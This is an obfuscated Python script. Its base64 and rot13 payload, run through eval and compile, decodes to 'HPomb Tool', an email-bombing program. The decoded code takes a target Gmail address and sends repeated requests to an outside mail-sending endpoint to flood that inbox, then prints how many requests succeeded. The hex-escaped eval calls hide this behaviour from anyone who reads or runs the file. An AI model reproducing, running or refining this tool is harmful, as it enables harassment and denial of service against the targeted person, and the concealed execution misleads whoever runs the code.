# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCnRyeToKICAgIGltcG9ydCBvcwogICAgaW1wb3J0IHN5cwogICAgaW1wb3J0IHJlcXVlc3RzIAogICAgaW1wb3J0IHN1YnByb2Nlc3MKZXhjZXB0IDoKICAgIHByaW50KCJQbGFzZSBJbnN0YWxsIFJlcXVpcmUgUGFja2FnZSBcblVzaW5nICdwaXAgaW5zdGFsbCAtciByZXF1aXJlbWVudC50eHQnIikKCgpSZWQgPSAnXDAzM1sxOzMxbScKQmx1ZT0gJ1wwMzNbMTszNm0nCkVuZGMgPSAnXDAzM1swbScKdmVybCA9IG9wZW4oImNvcmUvLnZlcnNpb24iLCAncicpLnJlYWQoKQoKdHlwZXkgPSAwMAoKdHJ5OgogICAgICAgIGltcG9ydCBub3RpZnkyCiAgICAgICAgdHlwZXkgPSAxCmV4Y2VwdCA6CiAgICB0eXBleSA9IDAKCmlmIHR5cGV5ID09IDAgOgogICAgICAgIGRlZiBzdGFydE0oKToKICAgICAgICAgICAgcGFzcwplbHNlOgogICAgZGVmIHN0YXJ0TSgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgbm90aWZ5Mi5pbml0KCdIUG9tYiBUb29sJykKICAgICAgICAgICAgbiA9IG5vdGlmeTIuTm90aWZpY2F0aW9uKCJIUG9tYiBUb29sIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIk1haWwgQm9tYmluZyBTdGFydCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgbi5zaG93KCkKICAgICAgICAgICAgbi50aW1lb3V0ID0gNTAwMDAKICAgICAgICAgICAgcHJpbnQoIlxhIikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KCJTb3JyeSBOb3RpZmljYXRpb24gRmVhdHVyZSBOb3QgRm9yIFlvdSIpCgoKCmRlZiBjbHIoKToKICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQpkZWYgYmFubmVyKCk6CiAgICAKICAgIGNscigpCiAgICBsb2dvPSIiIgog4paI4paI4paRIOKWiOKWiCAg4paI4paI4paT4paI4paI4paIICAg4paS4paI4paI4paI4paI4paIICAg4paI4paI4paI4paEIOKWhOKWiOKWiOKWiOKWkyDiloTiloTiloTiloQgICAK4paT4paI4paI4paRIOKWiOKWiOKWkuKWk+KWiOKWiOKWkSAg4paI4paI4paS4paS4paI4paI4paSICDilojilojilpLilpPilojilojilpLiloDilojiloAg4paI4paI4paS4paT4paI4paI4paI4paI4paI4paEIArilpLilojilojiloDiloDilojilojilpHilpPilojilojilpEg4paI4paI4paT4paS4p'
love = 'nF4cnV4cnV4cnEVPQvybwvybwvycYvycCvybwvybttVPNt4cnG4cnV4cnV4cnE4cnF4cnV4cnV4cnFVBXJuBXJvBXJvNevycUvycCvybtt4cnE4cnV4cnVVBXJxhXJvBXJvBXJuBXJvBXJx+XJxvQvycYvycYvybwvybttVPQvybwvybwvycUvycYvybwvybttVPNt4cnF4cnV4cnVVBXJxhXJvBXJvBXJxrXJvBXJtPNtPhXJxrXJx+XJvBXJxhXJxrXJvBXJvBXJx+XJxhXJvBXJvBXJxvQvycRtVBXJxrXJxFQvybwvybwvybwvybwvycCvycYvycUvycYvybwvybwvycVtVPQvycUvybwvybwvycYvycUvycCvybttVBXJtBXJvBXJxjbt4cnFVBXJxrXJxrXJxhXJxrXJxhXJxhXJx+XJxhXJxFQvycRtVBXJxrXJxFQvycYvycUvycYvycUvycYvycRt4cnEVBXJxhXJxFNtVBXJxFNt4cnE4cnE4cnF4cnG4cnV4cnV4cnV4cnN4cnFPvQvycVt4cnE4cnF4cnEVBXJxrXJxrXJxvQvycRtVPNtVPNt4cnEVBXJxvQvycYvycRt4cnEVPQvycRtVPNtVPQvycUvycYvycUvycVtVPQvycRtPvQvycRtVBXJxrXJxFQvycUvycUvycRtVPNtVPNt4cnEVBXJxFQvycRt4cnFVPQvycRtVPNtVPQvycRtVPNt4cnEVPNtVBXJxFNXVBXJxFNt4cnEVPQvycRtVPNtVPNtVPNtVPNt4cnEVBXJxFNtVPNtVPNtVBXJxFNtVPQvycRtVPNtVPNXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVBXJxFNXPvNtVPNtVPNtVPNtVPNtVPVvVvjvVvVXYF0gYF0gYF0gYF0gYF0gYFNtVP0gYF0gYF0gYF0gYF0gYF0gYF0gYF0XsPOYGSZtVSOlo2cyL3DtsPNtVUjtIzIlp2yiovN6VPVvVvk2MKWfYPVvVvO8Pv0gYF0gYF0gYF0gYF0gYF0tVPNgYF0gYF0gYF0gYF0gYF0gYF0gYF0gPykhKUEQpzIuqTIxVTW5VRuiozI5VSOiqUZhYv5potbgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYFNXVvVvPvNtVPOjpzyhqPuFMJDeoT9ao1fjKFgPoUIyX2kiM29oZI0eoT9ao1flKFgfo2qiJmAqXDbXPzEyMvOgLJyfXPx6PvNtVPO2MFN9VT9jMJ4bVzAipzHiYzEuVvjtW3VaXDbtVPNtqzIkVQ0tqzHhpzIuMPtcPvNtVPOcMPN9VUA0pvu2MKRhp3ElnKNbXFxXVPNtVTVtCFNjPvNtVPOFElN9VUA0pvucoaO1qPtvEJ50MKVtIzywqTygVR1unJjtLJExpzImplN6VPVcXDbtVPNtoaIgVQ0tnJ5jqKDbVxIhqTIlVR51oJWypvOiMvOALJyfVQbtVvxXVPNtVT1unJjtCFOcoaDboaIgXFNeVQRXVPNtVUOlnJ50XPWpoyk0KUEDoTIup2HtI2ScqPOPo21vnJ5aVSA0LKW0Yv4hVvxXPvNtVPOmqTSlqR0bXDbtVPNtMz9lVTxtnJ4tpzShM2Hb'
god = 'MSxtYWlsKToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vaG9uZXlwb3RzLnRlY2gvZmFrZW1haWwvaW5kZXgucGhwP21haWw9IitzdHIoUkcpKyImbnVtPSIrc3RyKGkpKyImaWQ9IitpZAogICAgICAgICAgICBoZWFkZXI9IHsKICAgICAgICAgICAgICAgICdIb3N0JzogJ2hvbmV5cG90cy50ZWNoJywKICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTIuMC4yNzQzLjExNiBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgnLAogICAgICAgICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuNScsCiAgICAgICAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgICAgICAgICAgICAgJ0Nvbm5lY3Rpb24nOiAnY2xvc2UnLAogICAgICAgICAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCh1cmw9dXJsLCBoZWFkZXJzPSBoZWFkZXIgLCB0aW1lb3V0PTIpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgcl9zdGF0dXMgPSByLnN0YXR1c19jb2RlCiAgICAgICAgICAgIGlmIHJfc3RhdHVzID09IDIwMCA6CiAgICAgICAgICAgICAgICBjbHIoKQogICAgICAgICAgICAgICAgYmFubmVyKCkKICAgICAgICAgICAgICAgIHByaW50KEJsdWUpCiAgICAgICAgICAgICAgICBwcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gIikKICAgICAgICAgICAgICAgIHByaW50KFJlZCArIiAgICAgICAgICAgICAgICAgIERldGFpbHMgIitCbHVlKQogICAgICAgICAgICAgICAgcHJpbnQoIiAgIFRhcmdldCBHbWFpbCAgICAgICAgICAgOiAiLFJHKQogICAgICAgICAgICAgICAgcHJpbnQoIiAgIE51bWJlciBvZiBSZXF1ZXN0cyBTZW50IDogIiwgbnVtKQogICAgICAgICAgICAgICAgcHJpbnQoIiAgIFN1Y2Nlc3NmdWwgUmVxdWVzdHMgICAgIDogIiwgaSApCiAgIC'
destiny = 'NtVPNtVPNtVPNtVPOjpzyhqPtvVPNtEzScoTIxVSWypKIyp3EmVPNtVPNtVPNtBvNvYPNjXDbtVPNtVPNtVPNtVPNtVPNtpUWcoaDbVv0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gVPVcPvNtVPNtVPNtVPNtVPNtVPOjpzyhqPtvVPNtVPNtVPNtVPNtDz9gLzyhMlOWovODpz9apzImplVcPvNtVPNtVPNtVPNtVTIfp2HtBtbtVPNtVPNtVPNtVPNtVPNtpUWcoaDbDzk1MFgfnJ5yYPqpovpcPvNtVPNtVPNtVPNtVPNtVPOjpzyhqPtaKT5pqSAioJI0nTyhMlOKpz9hMlO0olOGMJ5xVR1unJjtYv5poykhVPNtVPNtVSOfMJSmMFOQo250LJA0VSEiVREyqzIfo3OypvNaXDbtVPNtVPNtVPNtVPNtVPNtpUWcoaDbW1khKUDtVPNtVRIlpz9lVQbtAGN4KT4aXDbtVPNtVPNtVPNtVPNtVPNtpUWcoaDboTyhMFxXVPNtVPNtVPNtVPNtVPNtVUOlnJ50XSWyMPfaKT5pqSk0JlOGqJVtGJIhqFOqWlxXVPNtVPNtVPNtVPNtVPNtVUOlnJ50XRWfqJHtXlpaW1khJmNkKFOQo250LJA0VSEiVREyqzIfo3OypykhJmNlKFOOM2ScovOFqJ4tFSOioJVtIT9ioPpaWlxXVPNtVPNtVPNtVPNtVPNtVTIlpz9lAGNjVQ0tnJ5jqKDbW1khD2uio3AyVR9hMFOCpUEco25mVQbtWlxXVPNtVPNtVPNtVPNtVPNtVTyzVTIlpz9lAGNjVQ09VQR6PvNtVPNtVPNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXSgmrKZhMKuyL3I0LJWfMFjtW2AipzHiL29hqTSwqP5jrFqqXDbtVPNtVPNtVPNtVPNtVPNtMJkmMGbtPvNtVPNtVPNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXSgmrKZhMKuyL3I0LJWfMFjtW2ujo21vYaO5W10cVPNtVPNtVPNXPzAfpvtcPzWuoz5ypvtcPaElrGbXVPNtVUMyVQ0to3OyovtvL29lMF8hMTRvYPNapvpcPvNtVPO2MKRtCFO2MF5lMJSxXPxXVPNtVTyxZFN9VUA0pvu2MKRhp3ElnKNbXFxXVPNtVUVtCFOlMKS1MKA0pl5aMKDbW2u0qUOmBv8inT9hMKyjo3EmYaEyL2tipP9VHT9gLv91p2IlY3qbLKDhpTujWljtpTSlLJ1mCKfanJDaBzyxZFNfVPq3WmbkVU0cPzI4L2IjqQbXVPNtVPNtVPOjpzyhqPtaKT4tVPNtVSyiqKVtFJ50MKWhMKDtD29hozIwqTyiovOGoT93VP4hYvNaXDbtVPNtVPNtVUOlnJ50XPqpoyk0VPNtVPOSpaWipvN6VQHkZSkhWlxXVPNtVPNtVPOjpzyhqPufnJ5yXDbtVPNtVPNtVTyhpUI0XPqpoyk0HUWyp3ZtEJ50MKVtIT8tHaIhVRSaLJyhVRuPo21vVSEio2j6VPpcPvNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXSgmrKZhMKuyL3I0LJWfMFjtW2uvo21vYaO5W10cPz1unJjbXDb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))